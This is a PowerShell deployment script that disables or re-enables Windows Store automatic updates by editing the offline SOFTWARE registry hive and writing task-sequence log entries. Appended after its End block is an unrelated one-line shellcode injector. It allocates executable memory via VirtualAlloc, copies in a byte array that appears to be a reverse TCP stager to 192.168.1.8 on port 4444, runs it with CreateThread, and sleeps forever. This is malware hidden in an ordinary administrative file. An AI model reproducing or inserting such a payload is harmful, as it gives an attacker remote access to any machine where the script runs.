
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Enable or disable Windows Store updates state.")]
    [ValidateNotNullOrEmpty()]
    [ValidateSet("Enable", "Disable")]
    [string]$State
)
Begin {
    
    try {
        $TSEnvironment = New-Object -ComObject Microsoft.SMS.TSEnvironment -ErrorAction Stop
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to construct Microsoft.SMS.TSEnvironment object" ; exit 1
    }
}
Process {
    
    function Write-MDTLogEntry {
	    param(
		    [parameter(Mandatory=$true, HelpMessage="Value added to the log file.")]
		    [ValidateNotNullOrEmpty()]
		    [string]$Value,

		    [parameter(Mandatory=$true, HelpMessage="Severity for the log entry. 1 for Informational, 2 for Warning and 3 for Error.")]
		    [ValidateNotNullOrEmpty()]
            [ValidateSet("1", "2", "3")]
		    [string]$Severity,

		    [parameter(Mandatory=$false, HelpMessage="Name of the log file that the entry will written to.")]
		    [ValidateNotNullOrEmpty()]
		    [string]$FileName = "WindowsStoreUpdates.log"
	    )
	    
        $LogFilePath = Join-Path -Path (Join-Path -Path $env:SystemDrive -ChildPath "MININT\SMSOSD\OSDLOGS") -ChildPath $FileName

        
        $Time = -join @((Get-Date -Format "HH:mm:ss.fff"), "+", (Get-WmiObject -Class Win32_TimeZone | Select-Object -ExpandProperty Bias))

        
        $Date = (Get-Date -Format "MM-dd-yyyy")

        
        $Context = $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

        
        $LogText = "<![LOG[$($Value)]LOG]!><time=""$($Time)"" date=""$($Date)"" component=""WindowsStoreUpdates"" context=""$($Context)"" type=""$($Severity)"" thread=""$($PID)"" file="""">"
	
	    
        try {
	        Add-Content -Value $LogText -LiteralPath $LogFilePath -ErrorAction Stop
        }
        catch [System.Exception] {
            Write-Warning -Message "Unable to append log entry to WindowsStoreUpdates.log file. Error message: $($_.Exception.Message)"
        }
    }

    
    switch ($State) {
        "Enable" {
            try {
                Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate" -Name "AutoDownload" -Force -ErrorAction Stop
                Write-MDTLogEntry -Value "Successfully removed AutoDownload value, enabling Windows Store updates" -Severity 1
            }
            catch [System.Exception] {
                Write-MDTLogEntry -Value "Unable to remove AutoDownload value. Error message: $($_.Exception.Message)" -Severity 3
            }
        }
        "Disable" {
            
            try {
                $OSDrive = $TSEnvironment.Value("OSDisk")
                $LoadArguments = "load HKLM\Temp $($OSDrive)\Windows\system32\config\SOFTWARE"
                Write-MDTLogEntry -Value "Attempting to load SOFTWARE registry hive from: $($OSDrive)\Windows\system32\config\SOFTWARE" -Severity 1
                Start-Process -FilePath "reg.exe" -ArgumentList $LoadArguments -ErrorAction Stop
                Write-MDTLogEntry -Value "Successfully loaded default software registry hive to HKLM:\Temp" -Severity 1
            }
            catch [System.Exception] {
                Write-MDTLogEntry -Value "Unable to load default software registry hive. Error message: $($_.Exception.Message)" -Severity 3 ; break
            }

            
            Write-MDTLogEntry -Value "Waiting for registry hive to be accessible" -Severity 1
            do {
                Start-Sleep -Seconds 1
            }
            until (Test-Path -Path "HKLM:\Temp")

            
            try {
                New-Item -Path "HKLM:\Temp\Policies\Microsoft\WindowsStore" -ItemType Directory -Force -ErrorAction Stop
                New-ItemProperty -Path "HKLM:\Temp\Policies\Microsoft\WindowsStore" -Name "AutoDownload" -Value 2 -PropertyType "Dword" -Force -ErrorAction Stop
                Write-MDTLogEntry -Value "Successfully changed AutoDownload value to 2 (always off)" -Severity 1
            }
            catch [System.Exception] {
                Write-MDTLogEntry -Value "Unable to create AutoDownload value. Error message: $($_.Exception.Message)" -Severity 3
            }
        }
    }
}
End {
    do {
        try {
            
            [gc]::Collect()

            
            $UnloadArguments = "unload HKLM\Temp"
            Start-Process -FilePath "reg.exe" -ArgumentList $UnloadArguments -Wait -ErrorAction Stop
        }
        catch [System.Exception] {
            Write-MDTLogEntry -Value "Unable to unload default software registry hive. Error message: $($_.Exception.Message)" -Severity 3
        }
    }
    until ((Test-Path -Path HKLM:\Temp) -eq $false)
    Write-MDTLogEntry -Value "Successfully unloaded default software registry hive" -Severity 1
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

